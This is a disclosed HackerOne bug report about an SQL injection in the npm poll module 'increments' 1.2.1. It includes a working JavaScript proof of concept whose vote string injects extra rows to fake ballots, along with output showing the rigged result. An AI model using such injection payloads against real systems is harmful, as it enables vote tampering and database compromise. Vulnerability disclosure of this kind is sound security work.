---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - stack/node
  - vuln/sql-injection
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2020-02-02
submitted: 2019-03-12T10:40:01.889Z
bounty_usd: null
votes: 1
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "verichains"
source: "https://hackerone.com/reports/508346"
title: "[increments] sql injection"
---
# [increments] sql injection

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 1 | **Program:** Node.js third-party modules | **Disclosed:** 2020-02-02

- Report: [https://hackerone.com/reports/508346](https://hackerone.com/reports/508346)
- CWE: SQL Injection
- Submitted: 2019-03-12T10:40:01.889Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report `SQL Injection` in `increments`.
It allows creating fake polls.

# Module

**module name:** `increments`
**version:** `1.2.1`
**npm page:** `https://www.npmjs.com/package/increments`

## Module Description

> Increment is a **database-driven** for creating  **polls** and taking **votes** for various options, candidates, or parties. Using MongoJS collections as a storage framework, Increments offers in-depth statistical data on generated polls.

## Module Stats

[45] downloads in the last week

# Vulnerability

## Vulnerability Description

This module does not escape voting data allowing attacker to create fake votes.

## Steps To Reproduce:

- `npm install increments`
- run poc:

```javascript
const increments = require('increments');
increments.setup('mysql://root:@localhost:3306/test');
increments.poll('fruits', [{name:'Apples'},{name:'Bananas'},{name:'Oranges'},{name:'Pears'}]);
increments.vote('fruits', 'Oranges","0","0","1","0","0","0","0","","0")'+',(123,"Oranges","0","0","1","0","0","0","0","","0")'.repeat(10)+'#');
increments.statistics('fruits', function(e, f) {
	console.log( f.projectedWinner );
	process.exit(0);
});
```

Output:
```
{ name: 'Oranges',
  id: 'oranges',
  color: undefined,
  count: 11,
  percentage: 100 }
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- MacOS
- 8.12.0
- 6.4.1

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

SQL Injection.

## Timeline

- **Report Filed**
- **2019-03-12** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **2019-03-23** @verichains: Is hackerone currently busy with something?
- **Report Triaged**
- **External User Joined**
- **2019-05-31** @verichains: any update?
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
